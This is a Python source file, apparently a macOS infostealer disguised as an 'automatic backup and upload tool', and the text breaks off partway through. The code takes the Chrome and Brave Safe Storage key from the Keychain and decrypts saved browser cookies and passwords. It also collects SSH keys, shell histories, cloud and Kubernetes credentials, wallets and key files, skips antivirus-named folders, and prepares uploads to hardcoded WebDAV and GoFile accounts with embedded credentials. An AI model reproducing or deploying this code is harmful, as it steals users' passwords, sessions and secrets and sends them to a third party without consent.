# -*- coding: utf-8 -*-
"""
Macè‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½Macç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import requests
import subprocess
import getpass
import json
import base64
import sqlite3
import traceback
import urllib3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache
from requests.auth import HTTPBasicAuth

# ç¦ç”¨SSLè­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    logging.warning("âš ï¸ pycryptodomeæœªå®‰è£…ï¼Œæµè§ˆå™¨æ•°æ®å¯¼å‡ºåŠŸèƒ½å°†è¢«ç¦ç”¨")

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç½‘ç»œé…ç½®
    NETWORK_TIMEOUT = 3  # ç½‘ç»œæ£€æŸ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰
    CLIPBOARD_INTERVAL = 1200  # JTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰
    CLIPBOARD_CHECK_INTERVAL = 3  # JTBæ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 60  # JTBä¸Šä¼ æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    SCAN_TIMEOUT = 600  # æ‰«æç›®å½•è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_RETRY_COUNT = 3  # æ–‡ä»¶è®¿é—®é‡è¯•æ¬¡æ•°
    FILE_RETRY_DELAY = 5  # æ–‡ä»¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    COPY_CHUNK_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶å—å¤§å°ï¼ˆ1MBï¼Œæé«˜æ€§èƒ½ï¼‰
    PROGRESS_INTERVAL = 10  # è¿›åº¦æ˜¾ç¤ºé—´éš”ï¼ˆç§’ï¼‰
    
    # ä¸Šä¼ é…ç½®
    MAX_SERVER_RETRIES = 2  # æ¯ä¸ªæœåŠ¡å™¨æœ€å¤šå°è¯•æ¬¡æ•°
    FILE_DELAY_AFTER_UPLOAD = 1  # ä¸Šä¼ åç­‰å¾…æ–‡ä»¶é‡Šæ”¾çš„æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_DELETE_RETRY_COUNT = 3  # æ–‡ä»¶åˆ é™¤é‡è¯•æ¬¡æ•°
    FILE_DELETE_RETRY_DELAY = 2  # æ–‡ä»¶åˆ é™¤é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    
    # é”™è¯¯å¤„ç†é…ç½®
    CLIPBOARD_ERROR_WAIT = 60  # JTBç›‘æ§è¿ç»­é”™è¯¯ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    BACKUP_CHECK_INTERVAL = 3600  # å¤‡ä»½æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼Œæ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡ï¼‰
    ERROR_RETRY_DELAY = 60  # å‘ç”Ÿé”™è¯¯æ—¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    MAIN_ERROR_RETRY_DELAY = 300  # ä¸»ç¨‹åºé”™è¯¯é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼Œ5åˆ†é’Ÿï¼‰
    
    # ç£ç›˜ç©ºé—´æ£€æŸ¥
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # æœ€å°å¯ç”¨ç©ºé—´ï¼ˆ1GBï¼‰
    
    # å¤‡ä»½ç›®å½• - ç”¨æˆ·ä¸»ç›®å½•
    BACKUP_ROOT = os.path.expanduser('~/Documents/.AutoBackup')
    
    # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£/ä»£ç ç±»
        # æ–‡æœ¬å’Œæ–‡æ¡£
        ".txt", ".rtf", ".rst", ".tex", ".doc", ".docx", ".pages", ".md", ".pdf",
        # ç”µå­è¡¨æ ¼
        ".xls", ".xlsx", ".et", ".numbers", ".csv", ".tsv", ".one",
        # ä»£ç æ–‡ä»¶
        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".sh", ".bash", ".zsh", ".rs",
        # ç¯å¢ƒå˜é‡
        ".env",
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        # å¯†é’¥å’Œè¯ä¹¦
        ".pem", ".key", ".pub", ".crt", ".cer", ".der", ".p12", ".pfx",
        ".keystore", ".jks", ".asc", ".gpg", ".pgp", ".utc",
        # SSHç›¸å…³
        "id_rsa", "id_ecdsa", "id_ed25519", ".ssh",
        # äº‘æœåŠ¡é…ç½®
        ".aws", ".kube", ".docker", ".gitconfig",  
        # é…ç½®æ–‡ä»¶
        ".json", ".yaml", ".yml", ".xml", ".plist", ".conf", ".config", ".ini", ".toml",
        # å…¶ä»–å®‰å…¨ç›¸å…³
        ".secret", ".token", ".credential", ".wallet",
    ]   
    
    # æ’é™¤ç›®å½•é…ç½®
    EXCLUDE_INSTALL_DIRS = [
        # macOS ç³»ç»Ÿç›®å½•
        "Applications", "Library", "System", "Movies", "Music", "Pictures",
        
        # å¼€å‘å·¥å…·å’Œç¯å¢ƒ
        "node_modules", "venv", "myenv", "env", ".venv",
        ".gradle", ".m2", ".cargo", ".rustup", ".npm", ".nvm",
        ".local", ".cache", ".docker", ".gem",
        ".pyenv", ".rbenv", ".rvm", ".virtualenvs",
        "__pycache__", "dist", "build", "target",
        
        # IDE å’Œç¼–è¾‘å™¨
        ".vscode", ".vscode-server", ".cursor", ".idea", ".eclipse",
        ".vs", ".atom", ".sublime",
        
        # ç‰ˆæœ¬æ§åˆ¶
        ".git", ".github", ".svn", ".hg",
        
        # åŒ…ç®¡ç†å™¨
        ".yarn", ".pnpm-store", ".bun",
        
        # æµè§ˆå™¨ç›¸å…³
        "Google", "Chrome", "Brave", "Firefox", "Safari", "Opera",
        "Chromium", "Edge",
        
        # å…¶ä»–å¤§å‹åº”ç”¨
        "Steam", "Epic Games", "Unity", "UnrealEngine",
        "Adobe", "Autodesk", "Blender", "NVIDIA",
        
        # é€šè®¯è½¯ä»¶
        "Discord", "Zoom", "Teams", "Skype", "Slack", "WeChat", "telegram",
        
        # å…¶ä»–
        ".Trash", ".DS_Store", "Parallels", "VirtualBox VMs",
        "VMware", "Docker", ".zsh_sessions",

        # ä¸­æ–‡
        "ç«ç»’", "æ€æ¯’", "ç”µè„‘ç®¡å®¶",
    ]
    
    # å…³é”®è¯æ’é™¤
    EXCLUDE_KEYWORDS = [
        # è½¯ä»¶ç›¸å…³
        "program", "software", "install", "setup", "update",
        "patch", "cache", "temp", "tmp",
        
        # å¼€å‘ç›¸å…³
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        "__pycache__", ".pytest_cache",
        
        # å¤šåª’ä½“ç›¸å…³
        "music", "video", "movie", "audio", "media", "stream",
        "downloads", "torrents",
        
        # æ¸¸æˆç›¸å…³
        "steam", "game", "gaming", "save",
        
        # ä¸´æ—¶æ–‡ä»¶
        "log", "logs", "crash", "dumps", "dump", "report", "reports",
        
        # å…¶ä»–
        "bak", "obsolete", "archive", "vpn", "v2ray", "clash",
        "thumb", "thumbnail", "preview", "trash", 
    ]

    # GoFile ä¸Šä¼ é…ç½®ï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]
    
    # æŒ‡å®šè¦ç›´æ¥å¤åˆ¶çš„ç›®å½•å’Œæ–‡ä»¶ï¼ˆç›¸å¯¹äºç”¨æˆ·ä¸»ç›®å½•ï¼‰
    MACOS_SPECIFIC_DIRS = [
        ".ssh",                                                   # SSHé…ç½®
        ".bash_history",                                          # Bashå†å²è®°å½•
        ".python_history",                                        # Pythonå†å²è®°å½•
        ".node_repl_history",                                     # Node.js REPL å†å²è®°å½•
        ".wget-hsts",                                             # wget HSTS å†å²è®°å½•
        ".Xauthority",                                            # Xauthority æ–‡ä»¶
        ".ICEauthority",                                          # ICEauthority æ–‡ä»¶
        ".zsh_history",                                           # Zshå†å²è®°å½•
        ".zsh_sessions",                                          # Zshä¼šè¯
        "Desktop",                                                # æ¡Œé¢ç›®å½•
        "Library/Group Containers/group.com.apple.notes"          # å¤‡å¿˜å½•æ•°æ®ç›®å½•
        # VPSæœåŠ¡å•†é…ç½®ç›®å½•
        ".aws",               # AWSé…ç½®
        ".gcloud",            # Google Cloudé…ç½®
        ".azure",             # Azureé…ç½®
        ".aliyun",            # é˜¿é‡Œäº‘é…ç½®
        ".tencentcloud",      # è…¾è®¯äº‘é…ç½®
        ".tccli",             # è…¾è®¯äº‘CLIé…ç½®
        ".doctl",             # DigitalOceané…ç½®
        ".hcloud",            # Hetzneré…ç½®
        ".vultr",             # Vultré…ç½®
        ".linode",            # Linodeé…ç½®
        ".oci",               # Oracle Cloudé…ç½®
        ".bandwagon",         # æ¬ç“¦å·¥é…ç½®
        ".bwg",               # æ¬ç“¦å·¥é…ç½®
        ".docker",            # Dockeré…ç½®
        ".kube",              # Kubernetesé…ç½®
    ]

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BrowserDataExporter:
    """macOS æµè§ˆå™¨æ•°æ®å¯¼å‡ºå™¨"""
    
    def __init__(self, output_dir=None):
        home = os.path.expanduser('~')
        # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆæ”¯æŒå¤šä¸ª Profileï¼‰
        self.browsers = {
            "Chrome": os.path.join(home, "Library/Application Support/Google/Chrome"),
            "Safari": os.path.join(home, "Library/Safari"),  # Safari ä¸ä½¿ç”¨ Profile
            "Brave": os.path.join(home, "Library/Application Support/BraveSoftware/Brave-Browser"),
        }
        if output_dir is None:
            # è·å–ç”¨æˆ·åå‰5ä¸ªå­—ç¬¦ä½œä¸ºå‰ç¼€
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            self.output_dir = Path(BackupConfig.BACKUP_ROOT) / f"{user_prefix}_browser_exports"
        else:
            self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def get_master_key(self, browser_name):
        """è·å–æµè§ˆå™¨ä¸»å¯†é’¥ï¼ˆä» macOS Keychainï¼‰"""
        if not CRYPTO_AVAILABLE:
            return None
            
        try:
            # Safari ä¸ä½¿ç”¨ä¸»å¯†é’¥åŠ å¯†ï¼ˆä½¿ç”¨ç³»ç»Ÿ Keychain ç›´æ¥å­˜å‚¨ï¼‰
            if browser_name == "Safari":
                return None  # Safari ä½¿ç”¨ä¸åŒçš„æœºåˆ¶
            
            # Chrome/Brave çš„å¯†é’¥å­˜å‚¨åœ¨ Keychain ä¸­
            keychain_names = {
                "Chrome": "Chrome Safe Storage",
                "Brave": "Brave Safe Storage",
            }
            
            service_name = keychain_names.get(browser_name, "Chrome Safe Storage")
            
            # ä½¿ç”¨ security å‘½ä»¤ä» Keychain è·å–å¯†é’¥
            cmd = [
                'security',
                'find-generic-password',
                '-w',  # åªè¾“å‡ºå¯†ç 
                '-s', service_name,  # service name
                '-a', browser_name  # account name
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                password = result.stdout.strip()
                # Chrome/Edge/Brave ä½¿ç”¨ "peanuts" ä½œä¸ºå¯†ç çš„æƒ…å†µï¼ˆæŸäº›ç‰ˆæœ¬ï¼‰
                if not password:
                    password = "peanuts"
                
                # ä½¿ç”¨ PBKDF2 æ´¾ç”Ÿå¯†é’¥
                salt = b'saltysalt'
                iterations = 1003
                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                return key
            else:
                # å¦‚æœ Keychain ä¸­æ²¡æœ‰ï¼Œä½¿ç”¨é»˜è®¤å¯†ç 
                password = "peanuts"
                salt = b'saltysalt'
                iterations = 1003
                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                return key
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            logging.error(f"âŒ è·å– {browser_name} ä¸»å¯†é’¥å¤±è´¥: {e}")
            return None
    
    def decrypt_payload(self, cipher_text, master_key):
        """è§£å¯†æ•°æ®"""
        if not CRYPTO_AVAILABLE:
            return None
            
        try:
            if not cipher_text or not isinstance(cipher_text, (bytes, bytearray)):
                return None

            prefix = cipher_text[:3]
            # macOS Chrome v10+ ä½¿ç”¨ AES-128-CBC
            if prefix == b'v10':
                if not master_key:
                    return None
                iv = b' ' * 16  # Chrome on macOS uses blank IV
                payload = cipher_text[3:]  # ç§»é™¤ v10 å‰ç¼€
                cipher = AES.new(master_key, AES.MODE_CBC, iv)
                decrypted = cipher.decrypt(payload)
                # ç§»é™¤ PKCS7 padding
                padding_length = decrypted[-1]
                decrypted = decrypted[:-padding_length]
                return decrypted.decode('utf-8', errors='ignore')
            # Chromium v11 (AES-GCM)
            elif prefix == b'v11':
                if not master_key:
                    return None
                payload = cipher_text[3:]
                if len(payload) < 12 + 16:
                    return None
                nonce = payload[:12]
                ciphertext_with_tag = payload[12:]
                ciphertext = ciphertext_with_tag[:-16]
                tag = ciphertext_with_tag[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='ignore')
            # æ—§ç‰ˆæœ¬æˆ–å…¶ä»–æ ¼å¼
            else:
                return cipher_text.decode('utf-8', errors='ignore')
        except (ValueError, TypeError, IndexError) as e:
            return None
    
    def safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
        """å®‰å…¨å¤åˆ¶è¢«é”å®šçš„æ–‡ä»¶ï¼ˆæµè§ˆå™¨è¿è¡Œæ—¶ï¼‰"""
        for attempt in range(max_retries):
            try:
                shutil.copy2(source_path, dest_path)
                return True
            except PermissionError:
                try:
                    with open(source_path, 'rb') as src:
                        with open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                    return True
                except (OSError, IOError) as e:
                    if attempt == max_retries - 1:
                        logging.warning(f"âš ï¸  æ–‡ä»¶è¢«é”å®šï¼Œå°è¯• SQLite åœ¨çº¿å¤‡ä»½...")
                        return self.sqlite_online_backup(source_path, dest_path)
                    time.sleep(0.5)
            except (OSError, IOError) as e:
                logging.error(f"âŒ å¤åˆ¶å¤±è´¥: {e}")
                return False
        return False
    
    def sqlite_online_backup(self, source_db, dest_db):
        """ä½¿ç”¨ SQLite Online Backup å¤åˆ¶æ•°æ®åº“"""
        try:
            source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
            dest_conn = sqlite3.connect(dest_db)
            source_conn.backup(dest_conn)
            source_conn.close()
            dest_conn.close()
            logging.info("âœ… ä½¿ç”¨åœ¨çº¿å¤‡ä»½æˆåŠŸ")
            return True
        except (sqlite3.Error, OSError) as e:
            logging.error(f"âŒ åœ¨çº¿å¤‡ä»½å¤±è´¥: {e}")
            return False
    
    def export_cookies(self, browser_name, browser_path, master_key):
        """å¯¼å‡º Cookiesï¼ˆæ”¯æŒæµè§ˆå™¨è¿è¡Œæ—¶ï¼‰"""
        cookies_path = os.path.join(browser_path, "Cookies")
        
        if not os.path.exists(cookies_path):
            logging.warning(f"âš ï¸  {browser_name} Cookies æ–‡ä»¶ä¸å­˜åœ¨")
            return []
        
        # ä½¿ç”¨å®‰å…¨å¤åˆ¶æ–¹æ³•
        temp_cookies = os.path.join(self.output_dir, f"temp_{browser_name}_cookies.db")
        if not self.safe_copy_locked_file(cookies_path, temp_cookies):
            logging.error(f"âŒ æ— æ³•å¤åˆ¶ {browser_name} Cookies æ–‡ä»¶")
            return []
        
        cookies = []
        try:
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                
                # è§£å¯† cookie å€¼
                decrypted_value = self.decrypt_payload(encrypted_value, master_key)
                if decrypted_value:
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": decrypted_value,
                        "path": path,
                        "expires": expires,
                        "secure": bool(is_secure),
                        "httponly": bool(is_httponly)
                    })
            
            conn.close()
            logging.info(f"âœ… {browser_name} å¯¼å‡º {len(cookies)} ä¸ª Cookies")
        except (sqlite3.Error, OSError) as e:
            logging.error(f"âŒ å¯¼å‡º {browser_name} Cookies å¤±è´¥: {e}")
        finally:
            if os.path.exists(temp_cookies):
                os.remove(temp_cookies)
        
        return cookies
    
    def export_passwords(self, browser_name, browser_path, master_key):
        """å¯¼å‡ºå¯†ç ï¼ˆæ”¯æŒæµè§ˆå™¨è¿è¡Œæ—¶ï¼‰"""
        login_data_path = os.path.join(browser_path, "Login Data")
        if not os.path.exists(login_data_path):
            logging.warning(f"âš ï¸  {browser_name} Login Data æ–‡ä»¶ä¸å­˜åœ¨")
            return []
        
        # ä½¿ç”¨å®‰å…¨å¤åˆ¶æ–¹æ³•
        temp_login = os.path.join(self.output_dir, f"temp_{browser_name}_login.db")
        if not self.safe_copy_locked_file(login_data_path, temp_login):
            logging.error(f"âŒ æ— æ³•å¤åˆ¶ {browser_name} Login Data æ–‡ä»¶")
            return []
        
        passwords = []
        try:
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # è§£å¯†å¯†ç 
                decrypted_password = self.decrypt_payload(encrypted_password, master_key)
                if decrypted_password:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_password
                    })
            
            conn.close()
            logging.info(f"âœ… {browser_name} å¯¼å‡º {len(passwords)} ä¸ªå¯†ç ")
        except (sqlite3.Error, OSError) as e:
            logging.error(f"âŒ å¯¼å‡º {browser_name} å¯†ç å¤±è´¥: {e}")
        finally:
            if os.path.exists(temp_login):
                os.remove(temp_login)
        
        return passwords
    
    def encrypt_export_data(self, data, password):
        """åŠ å¯†å¯¼å‡ºæ•°æ®"""
        if not CRYPTO_AVAILABLE:
            logging.error("âŒ pycryptodomeæœªå®‰è£…ï¼Œæ— æ³•åŠ å¯†æ•°æ®")
            return None
            
        try:
            salt = get_random_bytes(32)
            key = PBKDF2(password, salt, dkLen=32, count=100000)
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data, ensure_ascii=False).encode('utf-8'))
            
            encrypted_data = {
                "salt": base64.b64encode(salt).decode('utf-8'),
                "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
                "tag": base64.b64encode(tag).decode('utf-8'),
                "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
            }
            return encrypted_data
        except (ValueError, TypeError, OSError) as e:
            logging.error(f"âŒ åŠ å¯†æ•°æ®å¤±è´¥: {e}")
            return None
    
    def export_all(self):
        """å¯¼å‡ºæ‰€æœ‰æµè§ˆå™¨æ•°æ®"""
        if not CRYPTO_AVAILABLE:
            logging.error("âŒ éœ€è¦å®‰è£… pycryptodome: pip3 install pycryptodome")
            return None
            
        logging.info("\n" + "="*60)
        logging.info("ğŸ” macOS æµè§ˆå™¨æ•°æ®å¯¼å‡º")
        logging.info("="*60)
        logging.info("âš ï¸  è­¦å‘Šï¼šæ­¤æ“ä½œå°†å¯¼å‡ºæ•æ„Ÿæ•°æ®")
        logging.info("â„¹ï¸  æç¤ºï¼šæ”¯æŒåœ¨æµè§ˆå™¨è¿è¡Œæ—¶å¯¼å‡ºï¼ˆæ— éœ€å…³é—­ï¼‰")
        logging.info("-"*60)
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "platform": "macOS",
            "browsers": {}
        }
        
        for browser_name, user_data_path in self.browsers.items():
            if not os.path.exists(user_data_path):
                logging.info(f"â­ï¸  è·³è¿‡ {browser_name}ï¼ˆæœªå®‰è£…ï¼‰")
                continue
            
            # Safari ç‰¹æ®Šå¤„ç†ï¼ˆä¸ä½¿ç”¨ Profileï¼‰
            if browser_name == "Safari":
                logging.info(f"\nğŸ“¦ å¤„ç† {browser_name}...")
                # Safari ä¸ä½¿ç”¨ä¸»å¯†é’¥åŠ å¯†
                master_key = None
                master_key_b64 = None
                cookies = self.export_cookies(browser_name, user_data_path, master_key)
                passwords = self.export_passwords(browser_name, user_data_path, master_key)
                
                if cookies or passwords:
                    all_data["browsers"][browser_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "master_key": master_key_b64  # Safari ä¸ä½¿ç”¨ Master Key
                    }
                    logging.info(f"âœ… {browser_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç ")
                continue
            
            # Chrome å’Œ Brave æ”¯æŒå¤šä¸ª Profile
            logging.info(f"\nğŸ“¦ å¤„ç† {browser_name}...")
            
            # è·å–ä¸»å¯†é’¥ï¼ˆæ‰€æœ‰ Profile å…±äº«åŒä¸€ä¸ª Master Keyï¼‰
            master_key = self.get_master_key(browser_name)
            master_key_b64 = None
            if master_key:
                # å°† Master Key ç¼–ç ä¸º base64 ä»¥ä¾¿ä¿å­˜
                master_key_b64 = base64.b64encode(master_key).decode('utf-8')
            else:
                logging.warning(f"âš ï¸  æ— æ³•è·å– {browser_name} ä¸»å¯†é’¥ï¼Œå°†è·³è¿‡åŠ å¯†æ•°æ®è§£å¯†")
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨ Cookies æˆ– Login Data æ–‡ä»¶
                        cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"âŒ æ‰«æ {browser_name} Profile ç›®å½•å¤±è´¥: {e}")
                continue
            
            if not profiles:
                logging.warning(f"âš ï¸  {browser_name} æœªæ‰¾åˆ°ä»»ä½• Profile")
                continue
            
            # ä¸ºæ¯ä¸ª Profile å¯¼å‡ºæ•°æ®
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  ğŸ“‚ å¤„ç† Profile: {profile_name}")
                
                cookies = self.export_cookies(browser_name, profile_path, master_key) if master_key else []
                passwords = self.export_passwords(browser_name, profile_path, master_key) if master_key else []
                
                if cookies or passwords:
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords)
                    }
                    logging.info(f"    âœ… {profile_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç ")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # å¤‡ä»½ Master Keyï¼ˆbase64 ç¼–ç ï¼Œæ‰€æœ‰ Profile å…±äº«ï¼‰
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "âœ…" if master_key_b64 else "âš ï¸"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                logging.info(f"âœ… {browser_name}: {len(browser_profiles)} ä¸ª Profile, {total_cookies} Cookies, {total_passwords} å¯†ç  {master_key_status} Master Key")
        
        # åŠ å¯†ä¿å­˜
        logging.info("\n" + "-"*60)
        password = "cookies2026"
        logging.info("ğŸ”’ ä½¿ç”¨é¢„è®¾åŠ å¯†å¯†ç ä¿æŠ¤å¯¼å‡ºæ–‡ä»¶")
        
        encrypted_data = self.encrypt_export_data(all_data, password)
        if not encrypted_data:
            return None
        
        # ä¿å­˜åˆ°æ–‡ä»¶
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.info("\n" + "="*60)
        logging.info("âœ… æµè§ˆå™¨æ•°æ®å¯¼å‡ºæˆåŠŸï¼")
        logging.info(f"ğŸ“ æ–‡ä»¶åç§°: {output_file.name}")
        logging.info("ğŸ”’ æ–‡ä»¶å·²åŠ å¯†ï¼ˆå¯†ç å·²è®¾ç½®ï¼‰")
        logging.info("="*60)
        
        return str(output_file)


class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        
        # Infini Cloud é…ç½®
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"
        self.infini_pass = "my95gfPVtKuDCpAK"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_mac_backup"
        
        # é…ç½® requests session ç”¨äºä¸Šä¼ 
        self.session = requests.Session()
        self.session.verify = False  # ç¦ç”¨SSLéªŒè¯
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API tokenï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        self.api_token = "eU3ZRZXNLQb6v4tc4u0PUQ8B0OsNTshf"
        
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                    if isinstance(record.msg, str):
                        msg = record.msg
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if msg.startswith("æ‰«æç›®å½•:") or msg.startswith("æ’é™¤ç›®å½•:"):
                                return super().format(record)
                            return None
